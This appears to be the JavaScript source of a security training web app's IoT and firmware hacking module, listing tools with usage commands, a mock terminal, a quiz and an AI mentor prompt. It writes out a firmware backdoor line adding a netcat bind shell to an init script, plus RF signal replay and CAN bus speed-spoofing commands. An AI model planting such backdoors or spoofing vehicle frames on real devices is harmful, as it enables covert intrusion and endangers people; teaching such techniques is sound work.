/**
 * PWNBOX CYBER COMMAND — MODULE 12: IOT SECURITY & FIRMWARE REVERSE ENGINEERING
 * Standardized Architecture & Layout matching Modules 1-11
 */

const MODULE_KEY = 'pwnbox_module_iotsecurity_completed';
const CUSTOM_TOOLS_KEY = 'pwnbox_custom_tools_IoTSecurity';
const EDITED_TOOLS_KEY = 'pwnbox_edited_tools_IoTSecurity';
const DELETED_TOOLS_KEY = 'pwnbox_deleted_tools_IoTSecurity';
const CUSTOM_CATS_KEY = 'pwnbox_custom_cats_IoTSecurity';

const defaultTools = [
    {
        name: "1. Binwalk (Firmware Extraction)",
        category: "FirmwareRecon",
        brief: "The industry-standard fast firmware analysis tool. Binwalk scans raw binary firmware images for embedded file signatures (SquashFS, CramFS, JFFS2, U-Boot, gzip, lzma) and carves them into a traversable Linux directory structure without needing physical device access.",
        use: `Scan firmware image headers and offsets:
binwalk router_firmware.bin

Automatically carve and extract all compressed filesystems:
binwalk -Me router_firmware.bin

Extract and analyze entropy to detect encrypted/compressed partitions:
binwalk -E router_firmware.bin`,
        useful: "Hardware vendors routinely leave default root passwords, hardcoded private SSH keys, and unauthenticated web administrative scripts exposed inside extracted SquashFS filesystems.",
        link: "https://github.com/ReFirmLabs/binwalk"
    },
    {
        name: "2. Firmware Mod Kit (FMK)",
        category: "FirmwareRecon",
        brief: "A specialized toolkit for unpacking, analyzing, modifying, and rebuilding embedded firmware images. FMK allows penetration testers to extract filesystems, inject custom reverse shells or backdoor binaries into startup scripts like /etc/init.d/rcS, and recompile the binary image with valid checksums.",
        use: `Extract target firmware image into working directory:
./extract-firmware.sh target_fw.bin

Navigate into filesystem and modify backdoor payload:
echo "/bin/busybox nc -l -p 1337 -e /bin/sh &" >> ./fmk/rootfs/etc/init.d/rcS

Rebuild modified firmware image with valid headers:
./build-firmware.sh`,
        useful: "Enables supply-chain weaponization simulations. Threat actors flash trojanized firmware onto enterprise IoT gateways, smart cameras, and VPN appliances to maintain persistent covert network access.",
        link: "https://github.com/rampageX/firmware-mod-kit"
    },
    {
        name: "3. QEMU (ARM & MIPS Emulation)",
        category: "BinaryEmulation",
        brief: "A high-performance machine emulator and virtualizer. Allows security researchers to execute foreign-architecture binaries (such as ARM, MIPS, PowerPC, and RISC-V) natively on x86_64 host workstations without requiring physical IoT microcontroller hardware.",
        use: `Emulate single MIPS router web service binary in user mode:
qemu-mips -L ./squashfs-root ./squashfs-root/bin/httpd

Attach GDB remote debugger to emulated process on port 1234:
qemu-arm -g 1234 -L ./squashfs-root ./squashfs-root/usr/sbin/service_daemon

Launch full system emulation with network tap interface:
qemu-system-arm -M versatilepb -kernel zImage -drive file=rootfs.ext2 -nographic`,
        useful: "Allows fuzzing and vulnerability exploitation of IoT web servers and daemons directly in development environments. Researchers can step through execution instructions in GDB and craft memory corruption exploits.",
        link: "https://www.qemu.org/"
    },
    {
        name: "4. FAT (Firmware Analysis Toolkit)",
        category: "BinaryEmulation",
        brief: "An automated orchestration engine built on top of Firmadyne. FAT automates network configuration, kernel boot arguments, and NVRAM emulation so entire Linux-based IoT router firmwares can be booted into an active running state with accessible web administrative interfaces.",
        use: `Execute automated firmware emulation:
python3 fat.py router_firmware.bin

Monitor network initialization and NVRAM patching:
[*] Extracting firmware...
[*] Identifying architecture: MIPS Big-Endian
[*] Setting up QEMU network bridge at 192.168.0.1...
[*] Web server running! Access management console at http://192.168.0.1`,
        useful: "Turns a static binary firmware dump into a live, interactive web target. Security researchers can test live authenticated and unauthenticated web exploits (such as command injections and CSRF) within seconds.",
        link: "https://github.com/attify/firmware-analysis-toolkit"
    },
    {
        name: "5. OpenOCD & JTAGenum",
        category: "HardwareDebugging",
        brief: "Open On-Chip Debugger (OpenOCD) provides hardware debugging, in-system programming, and boundary-scan testing for embedded microcontrollers. Paired with JTAGenum, it automates the discovery of hidden JTAG test access ports (TDI, TDO, TCK, TMS) and UART TX/RX pins on circuit boards.",
        use: `Run JTAGenum pinout identification on Arduino/Raspberry Pi:
python jtag_scan.py --pins 2,3,4,5,6,7,8

Connect OpenOCD to target ARM Cortex-M microcontroller via ST-Link:
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg

Dump complete internal Flash memory to workstation:
telnet localhost 4444
> halt
> dump_image flash_dump.bin 0x08000000 0x100000`,
        useful: "Physical access bypasses all software security controls. Dumping raw flash memory via JTAG recovers encryption keys, Wi-Fi credentials, and unencrypted operating system binaries directly from the silicon.",
        link: "https://openocd.org/"
    },
    {
        name: "6. GNU Radio & GQRX (SDR & RF)",
        category: "WirelessRF",
        brief: "Open-source software defined radio (SDR) signal processing framework. Paired with devices like RTL-SDR, HackRF, or LimeSDR, it allows operatives to capture, demodulate, replay, and reverse engineer wireless IoT transmissions (Sub-GHz remotes, Zigbee, LoRa, 433MHz smart meters, and Bluetooth LE).",
        use: `Inspect spectrum and waterfalls with GQRX GUI:
gqrx

Capture raw I/Q signal data from 433.92 MHz smart plug:
hackrf_transfer -r smart_switch.iq -f 433920000 -s 2000000 -a 1 -l 32

Replay captured packet to trigger remote actuator state:
hackrf_transfer -t smart_switch.iq -f 433920000 -s 2000000 -a 1 -x 20`,
        useful: "Most low-cost smart home devices and vehicle key fobs lack cryptographic replay protection or rolljam defenses, allowing trivial signal replay and state tampering from hundred-meter distances.",
        link: "https://www.gnuradio.org/"
    },
    {
        name: "7. Can-utils & SavvyCAN",
        category: "AutomotiveCAN",
        brief: "The premier Linux suite for sniffing, analyzing, and injecting packets into vehicle Controller Area Network (CAN) bus architectures. Interfaces with OBD-II diagnostic ports via SocketCAN adapters to capture vehicle telemetry and send spoofed powertrain control frames.",
        use: `Bring up virtual or physical CAN bus interface:
sudo ip link set can0 up type can bitrate 500000

Sniff all broadcasted CAN traffic in real time:
candump can0

Transmit crafted speed spoofing frame (ID 0x244):
cansend can0 244#FFFF000000000000

Record and replay vehicle diagnostic sessions:
cangen can0 -g 10 -I 123 -L 8 -v`,
        useful: "Modern vehicles rely on broadcast CAN architecture without native message authentication. Gaining access to the OBD-II port allows adversaries to manipulate instrument clusters, spoof braking inputs, and disable vehicle alarms.",
        link: "https://github.com/linux-can/can-utils"
    }
];

let tools = [];
let editingToolIndex = null;

const categoriesTemplate = {
    "FirmwareRecon": [],
    "BinaryEmulation": [],
    "HardwareDebugging": [],
    "WirelessRF": [],
    "AutomotiveCAN": []
};

const catDisplayNamesTemplate = {
    "FirmwareRecon": "📁 Firmware Extraction & Carving",
    "BinaryEmulation": "⚙️ Architecture & Binary Emulation",
    "HardwareDebugging": "🔌 Hardware Interfaces & JTAG",
    "WirelessRF": "📡 Wireless & SDR Radio",
    "AutomotiveCAN": "🚗 Automotive & CAN Bus"
};

const defaultCategoryOptionsHtml = `
            <option value="FirmwareRecon">📁 Firmware Extraction & Carving</option>
            <option value="BinaryEmulation">⚙️ Architecture & Binary Emulation</option>
            <option value="HardwareDebugging">🔌 Hardware Interfaces & JTAG</option>
            <option value="WirelessRF">📡 Wireless & SDR Radio</option>
            <option value="AutomotiveCAN">🚗 Automotive & CAN Bus</option>`;

function init() {
    const list = document.getElementById('toolList');
    if (!list) return;
    list.innerHTML = '';

    const moduleCategories = {};
    for (const k of Object.keys(categoriesTemplate)) moduleCategories[k] = [];
    const moduleCatDisplayNames = { ...catDisplayNamesTemplate };

    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        for (const [k, v] of Object.entries(customCats)) {
            moduleCategories[k] = [];
            moduleCatDisplayNames[k] = v;
        }
    } catch(e) { console.error(e); }

    const defaultCatKey = Object.keys(moduleCategories)[0];
    tools.forEach((tool, index) => {
        const cat = tool.category || defaultCatKey;
        if (moduleCategories[cat]) moduleCategories[cat].push({ tool, index });
        else {
            if (!moduleCategories[defaultCatKey]) moduleCategories[defaultCatKey] = [];
            moduleCategories[defaultCatKey].push({ tool, index });
        }
    });

    for (const [catName, catTools] of Object.entries(moduleCategories)) {
        if (catTools.length === 0) continue;
        const h = document.createElement('div');
        h.className = 'category-header';
        h.innerText = moduleCatDisplayNames[catName] || catName;
        list.appendChild(h);
        catTools.forEach(({ tool, index }) => {
            const div = document.createElement('div');
            div.className = 'tool-item';
            div.innerText = tool.name.split('.')[1]?.trim() || tool.name;
            div.onclick = () => showDetails(index, div);
            list.appendChild(div);
        });
    }

    if (!apiKey) {
        const dot = document.getElementById('statusDot');
        if (dot) dot.classList.remove('online');
        if (typeof addBotMessage === 'function') {
            addBotMessage("⚠️ API key not configured. Please configure GROQ_API_KEY in js/config.js.");
        }
    }
}

function reloadAllTools() {
    tools = defaultTools.map((t, idx) => ({ ...t, originalIndex: idx }));
    try {
        const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
        tools = tools.filter(t => !del.includes(t.originalIndex));
    } catch(e) {}
    try {
        const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
        tools.forEach(t => { if (edited[t.originalIndex]) Object.assign(t, edited[t.originalIndex]); });
    } catch(e) {}
    loadCustomTools();
    init();
}

function showDetails(index, element) {
    const details = document.getElementById('detailsPanel');
    const tool = tools[index];
    if (!tool || !details) return;

    document.querySelectorAll('.tool-item').forEach(el => el.classList.remove('active'));
    if (element) element.classList.add('active');

    const badgeClass = `badge-${tool.category.toLowerCase()}`;

    const displayName = tool.name.includes('.') ? tool.name.split('.')[1].trim() : tool.name;

    details.innerHTML = `
        <div class="card">
            <h1 style="display:flex;justify-content:space-between;align-items:center;width:100%;">
                <span>${displayName}<span class="badge ${badgeClass}">${tool.category}</span></span>
                <div style="display:flex;gap:8px;align-items:center;">
                    <button class="btn btn-edit-tool" onclick="openEditToolModal(${index})" style="font-size:0.8rem;padding:6px 12px;">✏️ Edit</button>
                    <button class="btn btn-delete-tool" onclick="confirmDeleteTool(${index})" style="font-size:0.8rem;padding:6px 12px;">🗑️ Delete</button>
                    <a href="${tool.link}" target="_blank" style="font-size:0.8rem;padding:6px 12px;">Launch ↗</a>
                </div>
            </h1>

            <div class="section-label">Simply Explained (What is it?)</div>
            <div class="section-content">${tool.brief}</div>

            <div class="section-label">How to actually use it</div>
            <div class="section-content">${tool.use}</div>

            <div class="section-label">Why Hackers care about this</div>
            <div class="section-content">${tool.useful}</div>
        </div>
    `;

    if (window.innerWidth <= 768 && typeof switchMobileTab === 'function') {
        switchMobileTab('details');
    }
}

// Custom Tool CRUD Handlers
function openAddToolModal() {
    editingToolIndex = null;
    const title = document.getElementById('modalTitle');
    if (title) title.innerText = "Add Custom Tool";
    const submitBtn = document.getElementById('modalSubmitBtn');
    if (submitBtn) submitBtn.innerText = "Save Tool";
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    loadCustomCategories();
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        setTimeout(() => modal.classList.add('active'), 10);
    }
}

function openEditToolModal(index) {
    editingToolIndex = index;
    const tool = tools[index];
    if (!tool) return;

    const title = document.getElementById('modalTitle');
    if (title) title.innerText = "Edit Tool: " + tool.name;
    const submitBtn = document.getElementById('modalSubmitBtn');
    if (submitBtn) submitBtn.innerText = "Update Tool";

    loadCustomCategories();

    const nameInput = document.getElementById('toolName');
    const catInput = document.getElementById('toolCategory');
    const briefInput = document.getElementById('toolBrief');
    const syntaxInput = document.getElementById('toolSyntax');
    const usefulInput = document.getElementById('toolUseful');
    const linkInput = document.getElementById('toolLink');

    if (nameInput) nameInput.value = tool.name;
    if (catInput) catInput.value = tool.category;
    if (briefInput) briefInput.value = tool.brief;
    if (syntaxInput) syntaxInput.value = tool.use;
    if (usefulInput) usefulInput.value = tool.useful;
    if (linkInput) linkInput.value = tool.link;

    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        setTimeout(() => modal.classList.add('active'), 10);
    }
}

function closeAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.style.display = 'none', 200);
    }
    editingToolIndex = null;
}

function submitNewTool() {
    const name = document.getElementById('toolName').value.trim();
    const category = document.getElementById('toolCategory').value;
    const brief = document.getElementById('toolBrief').value.trim();
    const use = document.getElementById('toolSyntax').value.trim();
    const useful = document.getElementById('toolUseful').value.trim();
    const link = document.getElementById('toolLink').value.trim() || '#';

    if (!name || !brief) return;

    if (editingToolIndex !== null) {
        const target = tools[editingToolIndex];
        if (target.isCustom) {
            try {
                const stored = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
                if (stored[target.customIndex]) {
                    stored[target.customIndex] = { name, category, brief, use, useful, link };
                    localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(stored));
                }
            } catch(e) {}
        } else {
            try {
                const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
                edited[target.originalIndex] = { name, category, brief, use, useful, link };
                localStorage.setItem(EDITED_TOOLS_KEY, JSON.stringify(edited));
            } catch(e) {}
        }
    } else {
        const newTool = { name, category, brief, use, useful, link };
        try {
            const stored = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
            stored.push(newTool);
            localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(stored));
        } catch(e) {}
    }

    closeAddToolModal();
    reloadAllTools();
}

function confirmDeleteTool(index) {
    const tool = tools[index];
    if (!tool) return;
    if (confirm(`Are you sure you want to delete "${tool.name}"?`)) {
        deleteTool(index);
    }
}

function deleteTool(index) {
    const tool = tools[index];
    if (!tool) return;

    if (tool.isCustom) {
        try {
            const stored = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
            stored.splice(tool.customIndex, 1);
            localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(stored));
        } catch(e) {}
    } else {
        try {
            const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
            if (!del.includes(tool.originalIndex)) del.push(tool.originalIndex);
            localStorage.setItem(DELETED_TOOLS_KEY, JSON.stringify(del));
        } catch(e) {}
    }

    reloadAllTools();
    const details = document.getElementById('detailsPanel');
    if (details) details.innerHTML = '<div style="text-align: center; color: var(--text-muted); margin-top: 20vh;"><h3>Select a tool from the menu to view beginner-friendly intelligence data.</h3></div>';
}

function loadCustomTools() {
    try {
        const stored = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
        stored.forEach((tool, cIdx) => {
            tools.push({ ...tool, isCustom: true, customIndex: cIdx });
        });
    } catch(e) {}
}

function loadCustomCategories() {
    const sel = document.getElementById('toolCategory');
    if (!sel) return;
    sel.innerHTML = defaultCategoryOptionsHtml;
    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        for (const [key, label] of Object.entries(customCats)) {
            const opt = document.createElement('option');
            opt.value = key;
            opt.innerText = label;
            sel.appendChild(opt);
        }
    } catch(e) {}
}

function showNewCategoryForm() {
    const f = document.getElementById('newCategoryForm');
    if (f) f.style.display = 'block';
}

function cancelNewCategory() {
    const f = document.getElementById('newCategoryForm');
    if (f) f.style.display = 'none';
    const n = document.getElementById('newCategoryName');
    if (n) n.value = '';
    const i = document.getElementById('newCategoryIcon');
    if (i) i.value = '';
}

function saveNewCategory() {
    const name = document.getElementById('newCategoryName').value.trim();
    const icon = document.getElementById('newCategoryIcon').value.trim() || '⚙️';
    if (!name) return;
    const key = name.replace(/\s+/g, '');
    const label = `${icon} ${name}`;
    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        customCats[key] = label;
        localStorage.setItem(CUSTOM_CATS_KEY, JSON.stringify(customCats));
        loadCustomCategories();
        document.getElementById('toolCategory').value = key;
        cancelNewCategory();
    } catch(e) { console.error(e); }
}

function switchMobileTab(tabId) {
    document.querySelectorAll('.nav-tab').forEach(btn => btn.classList.toggle('active', btn.getAttribute('onclick').includes(tabId)));
    document.body.className = document.body.className.replace(/\btab-\w+\b/g,'').trim();
    document.body.classList.add('tab-' + tabId);
}

function toggleModuleCompletion() {
    const isCompleted = localStorage.getItem(MODULE_KEY) === 'true';
    if (isCompleted) {
        localStorage.removeItem(MODULE_KEY);
        const btn = document.getElementById('completeModuleBtn');
        if (btn) {
            btn.textContent = 'Mark Module Completed';
            btn.style.background = '';
        }
    } else {
        localStorage.setItem(MODULE_KEY, 'true');
        const btn = document.getElementById('completeModuleBtn');
        if (btn) {
            btn.textContent = '✓ Module Completed!';
            btn.style.background = '#10b981';
        }
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("MODULE COMPLETED!", "Module 12 (IoT Security & Firmware Reverse Engineering) completion recorded in local dossier.", "success");
        }
    }
}

function updateCompletionButton() {
    if (localStorage.getItem(MODULE_KEY) === 'true') {
        const btn = document.getElementById('completeModuleBtn');
        if (btn) {
            btn.textContent = '✓ Module Completed!';
            btn.style.background = '#10b981';
        }
    }
}

// Terminal Emulation
function handleTermCommand(e) {
    if (e.key === 'Enter') {
        const input = document.getElementById('termInput');
        const cmd = input.value.trim();
        input.value = '';
        executeTerminalCommand(cmd);
    }
}

function executeTerminalCommand(cmd) {
    const out = document.getElementById('termOutput');
    if (!out) return;

    out.innerHTML += `\n<span style="color: #f59e0b;">iot-root@pwnbox:~#</span> ${cmd}\n`;

    const lower = cmd.toLowerCase();
    if (lower === 'clear') {
        out.innerHTML = '';
        return;
    } else if (lower.startsWith('binwalk')) {
        out.innerHTML += `<span style="color: #10b981;">DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TRX firmware header, little endian, image size: 14680064 bytes
56            0x38            gzip compressed data, from Unix, last modified: 2026-11-05
2048          0x800           SquashFS filesystem, little endian, version 4.0, size: 14678016 bytes
[+] Extracted squashfs-root to ./_firmware.bin.extracted/squashfs-root/</span>`;
    } else if (lower.startsWith('qemu-arm')) {
        out.innerHTML += `<span style="color: #38bdf8;">[+] Emulating ARMv7-A binary via user-mode QEMU...
[+] Binding emulated HTTP daemon on 0.0.0.0:8080...
[+] Starting micro_httpd embedded server: SUCCESS
[✓] Access emulated router portal at http://127.0.0.1:8080</span>`;
    } else if (lower.startsWith('cansend')) {
        out.innerHTML += `<span style="color: #facc15;">[+] CAN socket interface initialized: vcan0 (bitrate: 500kbps)
[>] Transmitted CAN Frame [ID: 0x123] [DLC: 8] [Payload: DE AD BE EF 00 11 22 33]
[✓] ACK Received from instrument cluster node.</span>`;
    } else if (lower.startsWith('jtag-scan')) {
        out.innerHTML += `<span style="color: #c084fc;">[+] Probing boundary-scan chain via FT232H adapter...
[+] Found 1 device in JTAG TAP chain:
    #0: Device ID: 0x4ba00477 (ARM Cortex-M4 TAP)
[✓] Hardware Debugger Ready: OpenOCD GDB server running on port 3333.</span>`;
    } else {
        out.innerHTML += `Command not found. Type 'help' for available hardware & firmware commands.`;
    }

    out.scrollTop = out.scrollHeight;
}

// Panel Tab Switcher
function switchPanelTab(tabName) {
    document.querySelectorAll('.panel-tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');

    const tabBtn = Array.from(document.querySelectorAll('.panel-tab')).find(b => b.textContent.toLowerCase().includes(tabName));
    if (tabBtn) tabBtn.classList.add('active');

    const content = document.getElementById(tabName + 'Tab');
    if (content) content.style.display = 'flex';

    if (tabName === 'quiz') renderQuiz();
}

// IoT Security Interactive Quiz
const iotQuizQuestions = [
    {
        q: "Which Linux filesystem format is most commonly found in embedded consumer IoT router firmware?",
        options: ["NTFS", "SquashFS", "Btrfs", "APFS"],
        answer: 1,
        explanation: "SquashFS is a read-only, highly compressed filesystem format heavily utilized in IoT routers and cameras due to limited flash storage memory."
    },
    {
        q: "What hardware interface provides full hardware control including halting CPU execution and dumping flash memory?",
        options: ["HDMI", "USB-C", "JTAG", "Ethernet RJ45"],
        answer: 2,
        explanation: "JTAG (Joint Test Action Group) provides on-chip debugging and boundary-scan access directly to microcontroller registers and memory."
    },
    {
        q: "In automotive vehicle security, which bus protocol communicates telemetry and control frames across Electronic Control Units (ECUs)?",
        options: ["CAN (Controller Area Network)", "I2C", "SPI", "RS-232"],
        answer: 0,
        explanation: "CAN bus is the robust vehicle bus standard designed to allow ECUs to communicate without a host computer."
    }
];

function renderQuiz() {
    const box = document.getElementById('quizBox');
    if (!box) return;

    let html = '<h3 style="margin-top:0; color:#f59e0b;">📟 IoT & Hardware Security Knowledge Assessment</h3>';
    iotQuizQuestions.forEach((item, qIdx) => {
        html += `
            <div class="quiz-card" style="background: rgba(255,255,255,0.03); border:1px solid var(--border-color); padding:12px; margin-bottom:12px; border-radius:4px;">
                <div style="font-weight:700; margin-bottom:8px; font-size:0.85rem;">${qIdx + 1}. ${item.q}</div>
                <div style="display:flex; flex-direction:column; gap:6px;">
        `;
        item.options.forEach((opt, oIdx) => {
            html += `<button type="button" class="quiz-opt-btn" onclick="checkQuizAnswer(${qIdx}, ${oIdx}, this)" style="text-align:left; padding:6px 10px; background:var(--bg-card); border:1px solid var(--border-color); color:var(--text-main); font-family:'Space Mono', monospace; font-size:0.75rem; cursor:pointer;">${opt}</button>`;
        });
        html += `</div><div id="quizExp_${qIdx}" style="display:none; margin-top:8px; font-size:0.75rem; padding:6px; font-family:'Space Mono', monospace;"></div></div>`;
    });
    box.innerHTML = html;
}

function checkQuizAnswer(qIdx, selectedIdx, btn) {
    const item = iotQuizQuestions[qIdx];
    const exp = document.getElementById(`quizExp_${qIdx}`);
    if (selectedIdx === item.answer) {
        btn.style.background = '#10b981';
        btn.style.color = '#000';
        if (exp) {
            exp.style.display = 'block';
            exp.style.background = 'rgba(16, 185, 129, 0.1)';
            exp.style.color = '#10b981';
            exp.innerHTML = `✅ CORRECT! ${item.explanation}`;
        }
    } else {
        btn.style.background = '#ef4444';
        btn.style.color = '#fff';
        if (exp) {
            exp.style.display = 'block';
            exp.style.background = 'rgba(239, 68, 68, 0.1)';
            exp.style.color = '#ef4444';
            exp.innerHTML = `❌ INCORRECT. ${item.explanation}`;
        }
    }
}

// AI Mentor Chat
function sendMessage() {
    const input = document.getElementById('userInput');
    const msg = input.value.trim();
    if (!msg) return;

    input.value = '';
    addUserMessage(msg);

    const systemPrompt = `You are the PwnBox Module 12 Specialist AI: an expert in IoT security, embedded firmware reverse engineering, hardware hacking (UART, JTAG, SPI, I2C), QEMU binary emulation, and automotive CAN bus attacks. Explain concepts clearly, emphasize practical commands (binwalk, qemu-arm, can-utils, openocd), and maintain a tactical cyberpunk mentor tone.`;

    if (typeof callGroqService === 'function') {
        callGroqService(msg, systemPrompt).then(reply => {
            addBotMessage(reply);
        }).catch(err => {
            addBotMessage("⚠️ Mentor offline: " + err.message);
        });
    } else {
        addBotMessage("📟 [Simulated Mentor] Firmware analysis tip: Always check entropy with 'binwalk -E' first to confirm whether the flash image is encrypted or plain compressed SquashFS!");
    }
}

function addUserMessage(text) {
    const box = document.getElementById('chatBox');
    if (!box) return;
    const div = document.createElement('div');
    div.className = 'message user-message';
    div.innerText = text;
    box.appendChild(div);
    box.scrollTop = box.scrollHeight;
}

function addBotMessage(text) {
    const box = document.getElementById('chatBox');
    if (!box) return;
    const div = document.createElement('div');
    div.className = 'message bot-message';
    div.innerHTML = text;
    box.appendChild(div);
    box.scrollTop = box.scrollHeight;
}

function handleEnter(e) {
    if (e.key === 'Enter') sendMessage();
}

window.openAddToolModal = openAddToolModal;
window.openEditToolModal = openEditToolModal;
window.closeAddToolModal = closeAddToolModal;
window.submitNewTool = submitNewTool;
window.confirmDeleteTool = confirmDeleteTool;
window.showNewCategoryForm = showNewCategoryForm;
window.cancelNewCategory = cancelNewCategory;
window.saveNewCategory = saveNewCategory;
window.switchMobileTab = switchMobileTab;
window.toggleModuleCompletion = toggleModuleCompletion;
window.showDetails = showDetails;
window.reloadAllTools = reloadAllTools;
window.switchPanelTab = switchPanelTab;
window.handleTermCommand = handleTermCommand;
window.checkQuizAnswer = checkQuizAnswer;
window.sendMessage = sendMessage;
window.handleEnter = handleEnter;

document.addEventListener('DOMContentLoaded', () => {
    reloadAllTools();
    updateCompletionButton();
});
